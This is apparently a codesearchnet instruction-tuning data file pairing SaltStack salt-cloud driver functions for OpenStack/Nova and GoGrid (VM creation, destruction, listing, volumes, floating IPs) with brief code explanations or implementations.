{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_size(conn, vm_):\n    '''\n    Return the VM's size object\n    '''\n    sizes = conn.list_sizes()\n    vm_size = config.get_cloud_config_value('size', vm_, __opts__)\n    if not vm_size:\n        return sizes[0]\n\n    for size in sizes:\n        if vm_size and six.text_type(vm_size) in (six.text_type(sizes[size]['id']), six.text_type(size)):\n            return sizes[size]['id']\n    raise SaltCloudNotFound(\n        'The specified size, \\'{0}\\', could not be found.'.format(vm_size)\n    )", "response": "Return the VM s size object"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns True if we are to ignore the specified IP. Compatible with IPv4.", "response": "def ignore_cidr(vm_, ip):\n    '''\n    Return True if we are to ignore the specified IP. Compatible with IPv4.\n    '''\n    if HAS_NETADDR is False:\n        log.error('Error: netaddr is not installed')\n        return 'Error: netaddr is not installed'\n\n    cidr = config.get_cloud_config_value(\n        'ignore_cidr', vm_, __opts__, default='', search_global=False\n    )\n    if cidr != '' and all_matching_cidrs(ip, [cidr]):\n        log.warning('IP \"%s\" found within \"%s\"; ignoring it.', ip, cidr)\n        return True\n\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns whether we should wait for rackconnect automation before running.", "response": "def rackconnect(vm_):\n    '''\n    Determine if we should wait for rackconnect automation before running.\n    Either 'False' (default) or 'True'.\n    '''\n    return config.get_cloud_config_value(\n        'rackconnect', vm_, __opts__, default=False,\n        search_global=False\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef rackconnectv3(vm_):\n    '''\n    Determine if server is using rackconnectv3 or not\n    Return the rackconnect network name or False\n    '''\n    return config.get_cloud_config_value(\n        'rackconnectv3', vm_, __opts__, default=False,\n        search_global=False\n    )", "response": "Return rackconnect network name or False"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndetermines if we should use extra network to bootstrap the current node.", "response": "def cloudnetwork(vm_):\n    '''\n    Determine if we should use an extra network to bootstrap\n    Either 'False' (default) or 'True'.\n    '''\n    return config.get_cloud_config_value(\n        'cloudnetwork', vm_, __opts__, default=False,\n        search_global=False\n    )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns whether managedcloud is enabled for this VM. Either False or True.", "response": "def managedcloud(vm_):\n    '''\n    Determine if we should wait for the managed cloud automation before\n    running. Either 'False' (default) or 'True'.\n    '''\n    return config.get_cloud_config_value(\n        'managedcloud', vm_, __opts__, default=False,\n        search_global=False\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndelete a single VM", "response": "def destroy(name, conn=None, call=None):\n    '''\n    Delete a single VM\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'The destroy action must be called with -d, --destroy, '\n            '-a or --action.'\n        )\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'destroying instance',\n        'salt/cloud/{0}/destroying'.format(name),\n        args={'name': name},\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    if not conn:\n        conn = get_conn()   # pylint: disable=E0602\n\n    node = conn.server_by_name(name)\n    profiles = get_configured_provider()['profiles']  # pylint: disable=E0602\n    if node is None:\n        log.error('Unable to find the VM %s', name)\n    profile = None\n    if 'metadata' in node.extra and 'profile' in node.extra['metadata']:\n        profile = node.extra['metadata']['profile']\n\n    flush_mine_on_destroy = False\n    if profile and profile in profiles and 'flush_mine_on_destroy' in profiles[profile]:\n        flush_mine_on_destroy = profiles[profile]['flush_mine_on_destroy']\n\n    if flush_mine_on_destroy:\n        log.info('Clearing Salt Mine: %s', name)\n        salt_client = salt.client.get_local_client(__opts__['conf_file'])\n        minions = salt_client.cmd(name, 'mine.flush')\n\n    log.info('Clearing Salt Mine: %s, %s', name, flush_mine_on_destroy)\n    log.info('Destroying VM: %s', name)\n    ret = conn.delete(node.id)\n    if ret:\n        log.info('Destroyed VM: %s', name)\n        # Fire destroy action\n        __utils__['cloud.fire_event'](\n            'event',\n            'destroyed instance',\n            'salt/cloud/{0}/destroyed'.format(name),\n            args={'name': name},\n            sock_dir=__opts__['sock_dir'],\n            transport=__opts__['transport']\n        )\n        if __opts__.get('delete_sshkeys', False) is True:\n            salt.utils.cloud.remove_sshkey(getattr(node, __opts__.get('ssh_interface', 'public_ips'))[0])\n        if __opts__.get('update_cachedir', False) is True:\n            __utils__['cloud.delete_minion_cachedir'](name, __active_provider_name__.split(':')[0], __opts__)\n        __utils__['cloud.cachedir_index_del'](name)\n        return True\n\n    log.error('Failed to Destroy VM: %s', name)\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nrequesting an instance from OpenStack.", "response": "def request_instance(vm_=None, call=None):\n    '''\n    Put together all of the information necessary to request an instance\n    through Novaclient and then fire off the request the instance.\n\n    Returns data about the instance\n    '''\n    if call == 'function':\n        # Technically this function may be called other ways too, but it\n        # definitely cannot be called with --function.\n        raise SaltCloudSystemExit(\n            'The request_instance action must be called with -a or --action.'\n        )\n    log.info('Creating Cloud VM %s', vm_['name'])\n    salt.utils.cloud.check_name(vm_['name'], 'a-zA-Z0-9._-')\n    conn = get_conn()\n    kwargs = vm_.copy()\n\n    try:\n        kwargs['image_id'] = get_image(conn, vm_)\n    except Exception as exc:\n        raise SaltCloudSystemExit(\n            'Error creating {0} on OPENSTACK\\n\\n'\n            'Could not find image {1}: {2}\\n'.format(\n                vm_['name'], vm_['image'], exc\n            )\n        )\n\n    try:\n        kwargs['flavor_id'] = get_size(conn, vm_)\n    except Exception as exc:\n        raise SaltCloudSystemExit(\n            'Error creating {0} on OPENSTACK\\n\\n'\n            'Could not find size {1}: {2}\\n'.format(\n                vm_['name'], vm_['size'], exc\n            )\n        )\n\n    kwargs['key_name'] = config.get_cloud_config_value(\n        'ssh_key_name', vm_, __opts__, search_global=False\n    )\n\n    security_groups = config.get_cloud_config_value(\n        'security_groups', vm_, __opts__, search_global=False\n    )\n    if security_groups is not None:\n        vm_groups = security_groups\n        avail_groups = conn.secgroup_list()\n        group_list = []\n\n        for vmg in vm_groups:\n            if vmg in [name for name, details in six.iteritems(avail_groups)]:\n                group_list.append(vmg)\n            else:\n                raise SaltCloudNotFound(\n                    'No such security group: \\'{0}\\''.format(vmg)\n                )\n\n        kwargs['security_groups'] = group_list\n\n    avz = config.get_cloud_config_value(\n        'availability_zone', vm_, __opts__, default=None, search_global=False\n    )\n    if avz is not None:\n        kwargs['availability_zone'] = avz\n\n    kwargs['nics'] = config.get_cloud_config_value(\n        'networks', vm_, __opts__, search_global=False, default=None\n    )\n\n    files = config.get_cloud_config_value(\n        'files', vm_, __opts__, search_global=False\n    )\n    if files:\n        kwargs['files'] = {}\n        for src_path in files:\n            if os.path.exists(files[src_path]):\n                with salt.utils.files.fopen(files[src_path], 'r') as fp_:\n                    kwargs['files'][src_path] = fp_.read()\n            else:\n                kwargs['files'][src_path] = files[src_path]\n\n    userdata_file = config.get_cloud_config_value(\n        'userdata_file', vm_, __opts__, search_global=False, default=None\n    )\n    if userdata_file is not None:\n        try:\n            with salt.utils.files.fopen(userdata_file, 'r') as fp_:\n                kwargs['userdata'] = salt.utils.cloud.userdata_template(\n                    __opts__, vm_, fp_.read()\n                )\n        except Exception as exc:\n            log.exception(\n                'Failed to read userdata from %s: %s', userdata_file, exc)\n\n    kwargs['config_drive'] = config.get_cloud_config_value(\n        'config_drive', vm_, __opts__, search_global=False\n    )\n\n    kwargs.update(get_block_mapping_opts(vm_))\n\n    event_kwargs = {\n        'name': kwargs['name'],\n        'image': kwargs.get('image_id', 'Boot From Volume'),\n        'size': kwargs['flavor_id'],\n    }\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'requesting instance',\n        'salt/cloud/{0}/requesting'.format(vm_['name']),\n        args={\n            'kwargs': __utils__['cloud.filter_event']('requesting', event_kwargs, list(event_kwargs)),\n        },\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    try:\n        data = conn.boot(**kwargs)\n    except Exception as exc:\n        raise SaltCloudSystemExit(\n            'Error creating {0} on Nova\\n\\n'\n            'The following exception was thrown by libcloud when trying to '\n            'run the initial deployment: {1}\\n'.format(\n                vm_['name'], exc\n            )\n        )\n    if data.extra.get('password', None) is None and vm_.get('key_filename', None) is None:\n        raise SaltCloudSystemExit('No password returned.  Set ssh_key_file.')\n\n    floating_ip_conf = config.get_cloud_config_value('floating_ip',\n                                                     vm_,\n                                                     __opts__,\n                                                     search_global=False,\n                                                     default={})\n    if floating_ip_conf.get('auto_assign', False):\n        floating_ip = None\n        if floating_ip_conf.get('ip_address', None) is not None:\n            ip_address = floating_ip_conf.get('ip_address', None)\n            try:\n                fl_ip_dict = conn.floating_ip_show(ip_address)\n                floating_ip = fl_ip_dict['ip']\n            except Exception as err:\n                raise SaltCloudSystemExit(\n                    'Error assigning floating_ip for {0} on Nova\\n\\n'\n                    'The following exception was thrown by libcloud when trying to '\n                    'assign a floating ip: {1}\\n'.format(\n                        vm_['name'], err\n                    )\n                )\n\n        else:\n            pool = floating_ip_conf.get('pool', 'public')\n            try:\n                floating_ip = conn.floating_ip_create(pool)['ip']\n            except Exception:\n                log.info('A new IP address was unable to be allocated. '\n                         'An IP address will be pulled from the already allocated list, '\n                         'This will cause a race condition when building in parallel.')\n                for fl_ip, opts in six.iteritems(conn.floating_ip_list()):\n                    if opts['fixed_ip'] is None and opts['pool'] == pool:\n                        floating_ip = fl_ip\n                        break\n                if floating_ip is None:\n                    log.error('No IP addresses available to allocate for this server: %s', vm_['name'])\n\n        def __query_node_data(vm_):\n            try:\n                node = show_instance(vm_['name'], 'action')\n                log.debug('Loaded node data for %s:\\n%s', vm_['name'], pprint.pformat(node))\n            except Exception as err:\n                log.error(\n                    'Failed to get nodes list: %s', err,\n                    # Show the traceback if the debug logging level is enabled\n                    exc_info_on_loglevel=logging.DEBUG\n                )\n                # Trigger a failure in the wait for IP function\n                return False\n            return node['state'] == 'ACTIVE' or None\n\n        # if we associate the floating ip here,then we will fail.\n        # As if we attempt to associate a floating IP before the Nova instance has completed building,\n        # it will fail.So we should associate it after the Nova instance has completed building.\n        try:\n            salt.utils.cloud.wait_for_ip(\n                __query_node_data,\n                update_args=(vm_,)\n            )\n        except (SaltCloudExecutionTimeout, SaltCloudExecutionFailure) as exc:\n            try:\n                # It might be already up, let's destroy it!\n                destroy(vm_['name'])\n            except SaltCloudSystemExit:\n                pass\n            finally:\n                raise SaltCloudSystemExit(six.text_type(exc))\n\n        try:\n            conn.floating_ip_associate(vm_['name'], floating_ip)\n            vm_['floating_ip'] = floating_ip\n        except Exception as exc:\n            raise SaltCloudSystemExit(\n                'Error assigning floating_ip for {0} on Nova\\n\\n'\n                'The following exception was thrown by libcloud when trying to '\n                'assign a floating ip: {1}\\n'.format(\n                    vm_['name'], exc\n                )\n            )\n\n    if not vm_.get('password', None):\n        vm_['password'] = data.extra.get('password', '')\n\n    return data, vm_"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create(vm_):\n    '''\n    Create a single VM from a data dict\n    '''\n    try:\n        # Check for required profile parameters before sending any API calls.\n        if vm_['profile'] and config.is_profile_configured(__opts__,\n                                                           __active_provider_name__ or 'nova',\n                                                           vm_['profile'],\n                                                           vm_=vm_) is False:\n            return False\n    except AttributeError:\n        pass\n\n    deploy = config.get_cloud_config_value('deploy', vm_, __opts__)\n    key_filename = config.get_cloud_config_value(\n        'ssh_key_file', vm_, __opts__, search_global=False, default=None\n    )\n    if key_filename is not None and not os.path.isfile(key_filename):\n        raise SaltCloudConfigError(\n            'The defined ssh_key_file \\'{0}\\' does not exist'.format(\n                key_filename\n            )\n        )\n\n    vm_['key_filename'] = key_filename\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'starting create',\n        'salt/cloud/{0}/creating'.format(vm_['name']),\n        args=__utils__['cloud.filter_event']('creating', vm_, ['name', 'profile', 'provider', 'driver']),\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n    conn = get_conn()\n\n    if 'instance_id' in vm_:\n        # This was probably created via another process, and doesn't have\n        # things like salt keys created yet, so let's create them now.\n        if 'pub_key' not in vm_ and 'priv_key' not in vm_:\n            log.debug('Generating minion keys for \\'%s\\'', vm_['name'])\n            vm_['priv_key'], vm_['pub_key'] = salt.utils.cloud.gen_keys(\n                salt.config.get_cloud_config_value(\n                    'keysize',\n                    vm_,\n                    __opts__\n                )\n            )\n        data = conn.server_show_libcloud(vm_['instance_id'])\n        if vm_['key_filename'] is None and 'change_password' in __opts__ and __opts__['change_password'] is True:\n            vm_['password'] = salt.utils.pycrypto.secure_password()\n            conn.root_password(vm_['instance_id'], vm_['password'])\n    else:\n        # Put together all of the information required to request the instance,\n        # and then fire off the request for it\n        data, vm_ = request_instance(vm_)\n\n        # Pull the instance ID, valid for both spot and normal instances\n        vm_['instance_id'] = data.id\n\n    try:\n        data = salt.utils.cloud.wait_for_ip(\n            _query_node_data,\n            update_args=(vm_, data, conn),\n            timeout=config.get_cloud_config_value(\n                'wait_for_ip_timeout', vm_, __opts__, default=10 * 60),\n            interval=config.get_cloud_config_value(\n                'wait_for_ip_interval', vm_, __opts__, default=10),\n        )\n    except (SaltCloudExecutionTimeout, SaltCloudExecutionFailure) as exc:\n        try:\n            # It might be already up, let's destroy it!\n            destroy(vm_['name'])\n        except SaltCloudSystemExit:\n            pass\n        finally:\n            raise SaltCloudSystemExit(six.text_type(exc))\n\n    log.debug('VM is now running')\n\n    if ssh_interface(vm_) == 'private_ips':\n        ip_address = preferred_ip(vm_, data.private_ips)\n    elif ssh_interface(vm_) == 'fixed_ips':\n        ip_address = preferred_ip(vm_, data.fixed_ips)\n    elif ssh_interface(vm_) == 'floating_ips':\n        ip_address = preferred_ip(vm_, data.floating_ips)\n    else:\n        ip_address = preferred_ip(vm_, data.public_ips)\n    log.debug('Using IP address %s', ip_address)\n\n    if salt.utils.cloud.get_salt_interface(vm_, __opts__) == 'private_ips':\n        salt_ip_address = preferred_ip(vm_, data.private_ips)\n        log.info('Salt interface set to: %s', salt_ip_address)\n    elif salt.utils.cloud.get_salt_interface(vm_, __opts__) == 'fixed_ips':\n        salt_ip_address = preferred_ip(vm_, data.fixed_ips)\n        log.info('Salt interface set to: %s', salt_ip_address)\n    elif salt.utils.cloud.get_salt_interface(vm_, __opts__) == 'floating_ips':\n        salt_ip_address = preferred_ip(vm_, data.floating_ips)\n        log.info('Salt interface set to: %s', salt_ip_address)\n    else:\n        salt_ip_address = preferred_ip(vm_, data.public_ips)\n        log.debug('Salt interface set to: %s', salt_ip_address)\n\n    if not ip_address:\n        raise SaltCloudSystemExit('A valid IP address was not found')\n\n    vm_['ssh_host'] = ip_address\n    vm_['salt_host'] = salt_ip_address\n\n    ret = __utils__['cloud.bootstrap'](vm_, __opts__)\n\n    ret.update(data.__dict__)\n\n    if 'password' in ret['extra']:\n        del ret['extra']['password']\n\n    log.info('Created Cloud VM \\'%s\\'', vm_['name'])\n    log.debug(\n        '\\'%s\\' VM creation details:\\n%s',\n        vm_['name'], pprint.pformat(data.__dict__)\n    )\n\n    event_data = {\n        'name': vm_['name'],\n        'profile': vm_['profile'],\n        'provider': vm_['driver'],\n        'instance_id': vm_['instance_id'],\n        'floating_ips': data.floating_ips,\n        'fixed_ips': data.fixed_ips,\n        'private_ips': data.private_ips,\n        'public_ips': data.public_ips\n    }\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'created instance',\n        'salt/cloud/{0}/created'.format(vm_['name']),\n        args=__utils__['cloud.filter_event']('created', event_data, list(event_data)),\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n    __utils__['cloud.cachedir_index_add'](vm_['name'], vm_['profile'], 'nova', vm_['driver'])\n    return ret", "response": "Create a single VM from a data dict"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of the VMs that are in this location", "response": "def list_nodes(call=None, **kwargs):\n    '''\n    Return a list of the VMs that in this location\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'The list_nodes function must be called with -f or --function.'\n        )\n\n    ret = {}\n    conn = get_conn()\n    server_list = conn.server_list()\n\n    if not server_list:\n        return {}\n    for server in server_list:\n        server_tmp = conn.server_show(server_list[server]['id']).get(server)\n\n        # If the server is deleted while looking it up, skip\n        if server_tmp is None:\n            continue\n\n        private = []\n        public = []\n        if 'addresses' not in server_tmp:\n            server_tmp['addresses'] = {}\n        for network in server_tmp['addresses']:\n            for address in server_tmp['addresses'][network]:\n                if salt.utils.cloud.is_public_ip(address.get('addr', '')):\n                    public.append(address['addr'])\n                elif ':' in address['addr']:\n                    public.append(address['addr'])\n                elif '.' in address['addr']:\n                    private.append(address['addr'])\n\n        if server_tmp['accessIPv4']:\n            if salt.utils.cloud.is_public_ip(server_tmp['accessIPv4']):\n                public.append(server_tmp['accessIPv4'])\n            else:\n                private.append(server_tmp['accessIPv4'])\n        if server_tmp['accessIPv6']:\n            public.append(server_tmp['accessIPv6'])\n\n        ret[server] = {\n            'id': server_tmp['id'],\n            'image': server_tmp['image']['id'],\n            'size': server_tmp['flavor']['id'],\n            'state': server_tmp['state'],\n            'private_ips': private,\n            'public_ips': public,\n        }\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of the VMs that are in this location", "response": "def list_nodes_full(call=None, **kwargs):\n    '''\n    Return a list of the VMs that in this location\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            (\n                'The list_nodes_full function must be called with'\n                ' -f or --function.'\n            )\n        )\n\n    ret = {}\n    conn = get_conn()\n    server_list = conn.server_list()\n\n    if not server_list:\n        return {}\n    for server in server_list:\n        try:\n            ret[server] = conn.server_show_libcloud(\n                server_list[server]['id']\n            ).__dict__\n        except IndexError as exc:\n            ret = {}\n\n    __utils__['cloud.cache_node_list'](ret, __active_provider_name__.split(':')[0], __opts__)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of the VMs that are in this location", "response": "def list_nodes_min(call=None, **kwargs):\n    '''\n    Return a list of the VMs that in this location\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            (\n                'The list_nodes_min function must be called with'\n                ' -f or --function.'\n            )\n        )\n\n    conn = get_conn()\n    server_list = conn.server_list_min()\n\n    if not server_list:\n        return {}\n    return server_list"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef volume_create(name, size=100, snapshot=None, voltype=None, **kwargs):\n    '''\n    Create block storage device\n    '''\n    conn = get_conn()\n    create_kwargs = {'name': name,\n                     'size': size,\n                     'snapshot': snapshot,\n                     'voltype': voltype}\n    create_kwargs['availability_zone'] = kwargs.get('availability_zone', None)\n    return conn.volume_create(**create_kwargs)", "response": "Create block storage device"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef volume_attach(name, server_name, device='/dev/xvdb', **kwargs):\n    '''\n    Attach block volume\n    '''\n    conn = get_conn()\n    return conn.volume_attach(\n        name,\n        server_name,\n        device,\n        timeout=300\n    )", "response": "Attach a block volume to a server"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef volume_create_attach(name, call=None, **kwargs):\n    '''\n    Create and attach volumes to created node\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'The create_attach_volumes action must be called with '\n            '-a or --action.'\n        )\n\n    if type(kwargs['volumes']) is str:\n        volumes = salt.utils.yaml.safe_load(kwargs['volumes'])\n    else:\n        volumes = kwargs['volumes']\n\n    ret = []\n    for volume in volumes:\n        created = False\n\n        volume_dict = {\n            'name': volume['name'],\n        }\n        if 'volume_id' in volume:\n            volume_dict['volume_id'] = volume['volume_id']\n        elif 'snapshot' in volume:\n            volume_dict['snapshot'] = volume['snapshot']\n        else:\n            volume_dict['size'] = volume['size']\n\n            if 'type' in volume:\n                volume_dict['type'] = volume['type']\n            if 'iops' in volume:\n                volume_dict['iops'] = volume['iops']\n\n        if 'id' not in volume_dict:\n            created_volume = create_volume(**volume_dict)\n            created = True\n            volume_dict.update(created_volume)\n\n        attach = attach_volume(\n            name=volume['name'],\n            server_name=name,\n            device=volume.get('device', None),\n            call='action'\n        )\n\n        if attach:\n            msg = (\n                '{0} attached to {1} (aka {2})'.format(\n                    volume_dict['id'],\n                    name,\n                    volume_dict['name'],\n                )\n            )\n            log.info(msg)\n            ret.append(msg)\n    return ret", "response": "Create and attach volumes to a node"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nallocating a floating IP and return the resource", "response": "def floating_ip_create(kwargs, call=None):\n    '''\n    Allocate a floating IP\n\n    .. versionadded:: 2016.3.0\n    '''\n    if call != 'function':\n        raise SaltCloudSystemExit(\n            'The floating_ip_create action must be called with -f or --function'\n        )\n\n    if 'pool' not in kwargs:\n        log.error('pool is required')\n        return False\n\n    conn = get_conn()\n    return conn.floating_ip_create(kwargs['pool'])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nassociate a floating IP address to a server", "response": "def floating_ip_associate(name, kwargs, call=None):\n    '''\n    Associate a floating IP address to a server\n\n    .. versionadded:: 2016.3.0\n    '''\n    if call != 'action':\n        raise SaltCloudSystemExit(\n            'The floating_ip_associate action must be called with -a of --action.'\n        )\n\n    if 'floating_ip' not in kwargs:\n        log.error('floating_ip is required')\n        return False\n\n    conn = get_conn()\n    conn.floating_ip_associate(name, kwargs['floating_ip'])\n    return list_nodes()[name]"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create(vm_):\n    '''\n    Create a single VM from a data dict\n    '''\n    try:\n        # Check for required profile parameters before sending any API calls.\n        if vm_['profile'] and config.is_profile_configured(__opts__,\n                                                           __active_provider_name__ or 'gogrid',\n                                                           vm_['profile'],\n                                                           vm_=vm_) is False:\n            return False\n    except AttributeError:\n        pass\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'starting create',\n        'salt/cloud/{0}/creating'.format(vm_['name']),\n        args=__utils__['cloud.filter_event']('creating', vm_, ['name', 'profile', 'provider', 'driver']),\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    if len(vm_['name']) > 20:\n        raise SaltCloudException('VM names must not be longer than 20 characters')\n\n    log.info('Creating Cloud VM %s', vm_['name'])\n    image_id = avail_images()[vm_['image']]['id']\n    if 'assign_public_ip' in vm_:\n        host_ip = vm_['assign_public_ip']\n    else:\n        public_ips = list_public_ips()\n        if not public_ips:\n            raise SaltCloudException('No more IPs available')\n        host_ip = next(iter(public_ips))\n\n    create_kwargs = {\n        'name': vm_['name'],\n        'image': image_id,\n        'ram': vm_['size'],\n        'ip': host_ip,\n    }\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'requesting instance',\n        'salt/cloud/{0}/requesting'.format(vm_['name']),\n        args={\n            'kwargs': __utils__['cloud.filter_event']('requesting', create_kwargs, list(create_kwargs)),\n        },\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    try:\n        data = _query('grid', 'server/add', args=create_kwargs)\n    except Exception:\n        log.error(\n            'Error creating %s on GOGRID\\n\\n'\n            'The following exception was thrown when trying to '\n            'run the initial deployment:\\n', vm_['name'],\n            # Show the traceback if the debug logging level is enabled\n            exc_info_on_loglevel=logging.DEBUG\n        )\n        return False\n\n    ssh_username = config.get_cloud_config_value(\n        'ssh_username', vm_, __opts__, default='root'\n    )\n\n    def wait_for_apipass():\n        '''\n        Wait for the password to become available, via the API\n        '''\n        try:\n            passwords = list_passwords()\n            return passwords[vm_['name']][0]['password']\n        except KeyError:\n            pass\n        time.sleep(5)\n        return False\n\n    vm_['password'] = salt.utils.cloud.wait_for_fun(\n        wait_for_apipass,\n        timeout=config.get_cloud_config_value(\n            'wait_for_fun_timeout', vm_, __opts__, default=15 * 60),\n    )\n\n    vm_['ssh_host'] = host_ip\n    ret = __utils__['cloud.bootstrap'](vm_, __opts__)\n    ret.update(data)\n\n    log.info('Created Cloud VM \\'%s\\'', vm_['name'])\n    log.debug(\n        '\\'%s\\' VM creation details:\\n%s',\n        vm_['name'], pprint.pformat(data)\n    )\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'created instance',\n        'salt/cloud/{0}/created'.format(vm_['name']),\n        args=__utils__['cloud.filter_event']('created', vm_, ['name', 'profile', 'provider', 'driver']),\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    return ret", "response": "Create a single VM from a data dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of nodes in the cloud provider", "response": "def list_nodes(full=False, call=None):\n    '''\n    List of nodes, keeping only a brief listing\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-cloud -Q\n    '''\n    if call == 'action':\n        raise SaltCloudSystemExit(\n            'The list_nodes function must be called with -f or --function.'\n        )\n\n    ret = {}\n    nodes = list_nodes_full('function')\n    if full:\n        return nodes\n\n    for node in nodes:\n        ret[node] = {}\n        for item in ('id', 'image', 'size', 'public_ips', 'private_ips', 'state'):\n            ret[node][item] = nodes[node][item]\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef list_nodes_full(call=None):\n    '''\n    List nodes, with all available information\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-cloud -F\n    '''\n    response = _query('grid', 'server/list')\n\n    ret = {}\n    for item in response['list']:\n        name = item['name']\n        ret[name] = item\n\n        ret[name]['image_info'] = item['image']\n        ret[name]['image'] = item['image']['friendlyName']\n        ret[name]['size'] = item['ram']['name']\n        ret[name]['public_ips'] = [item['ip']['ip']]\n        ret[name]['private_ips'] = []\n        ret[name]['state_info'] = item['state']\n        if 'active' in item['state']['description']:\n            ret[name]['state'] = 'RUNNING'\n\n    return ret", "response": "List all available nodes"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a dict of available locations", "response": "def avail_locations():\n    '''\n    Available locations\n    '''\n    response = list_common_lookups(kwargs={'lookup': 'ip.datacenter'})\n\n    ret = {}\n    for item in response['list']:\n        name = item['name']\n        ret[name] = item\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef avail_sizes():\n    '''\n    Available sizes\n    '''\n    response = list_common_lookups(kwargs={'lookup': 'server.ram'})\n\n    ret = {}\n    for item in response['list']:\n        name = item['name']\n        ret[name] = item\n\n    return ret", "response": "Returns a dict of available sizes for the current server."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget a list of available images", "response": "def avail_images():\n    '''\n    Available images\n    '''\n    response = _query('grid', 'image/list')\n\n    ret = {}\n    for item in response['list']:\n        name = item['friendlyName']\n        ret[name] = item\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nlists all passwords on the account.", "response": "def list_passwords(kwargs=None, call=None):\n    '''\n    List all password on the account\n\n    .. versionadded:: 2015.8.0\n    '''\n    response = _query('support', 'password/list')\n\n    ret = {}\n    for item in response['list']:\n        if 'server' in item:\n            server = item['server']['name']\n            if server not in ret:\n                ret[server] = []\n            ret[server].append(item)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlists all available public IPs.", "response": "def list_public_ips(kwargs=None, call=None):\n    '''\n    List all available public IPs.\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt-cloud -f list_public_ips <provider>\n\n    To list unavailable (assigned) IPs, use:\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt-cloud -f list_public_ips <provider> state=assigned\n\n    .. versionadded:: 2015.8.0\n    '''\n    if kwargs is None:\n        kwargs = {}\n\n    args = {}\n    if 'state' in kwargs:\n        if kwargs['state'] == 'assigned':\n            args['ip.state'] = 'Assigned'\n        else:\n            args['ip.state'] = 'Unassigned'\n    else:\n        args['ip.state'] = 'Unassigned'\n\n    args['ip.type'] = 'Public'\n\n    response = _query('grid', 'ip/list', args=args)\n\n    ret = {}\n    for item in response['list']:\n        name = item['ip']\n        ret[name] = item\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_common_lookups(kwargs=None, call=None):\n    '''\n    List common lookups for a particular type of item\n\n    .. versionadded:: 2015.8.0\n    '''\n    if kwargs is None:\n        kwargs = {}\n\n    args = {}\n    if 'lookup' in kwargs:\n        args['lookup'] = kwargs['lookup']\n\n    response = _query('common', 'lookup/list', args=args)\n\n    return response", "response": "List common lookups for a particular type of item."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef show_instance(name, call=None):\n    '''\n    Start a machine by name\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-cloud -a show_instance vm_name\n\n    .. versionadded:: 2015.8.0\n    '''\n    response = _query('grid', 'server/get', args={'name': name})\n    ret = {}\n    for item in response['list']:\n        name = item['name']\n        ret[name] = item\n\n        ret[name]['image_info'] = item['image']\n        ret[name]['image'] = item['image']['friendlyName']\n        ret[name]['size'] = item['ram']['name']\n        ret[name]['public_ips'] = [item['ip']['ip']]\n        ret[name]['private_ips'] = []\n        ret[name]['state_info'] = item['state']\n        if 'active' in item['state']['description']:\n            ret[name]['state'] = 'RUNNING'\n    return ret", "response": "Show the details of a single virtual machine by name"}
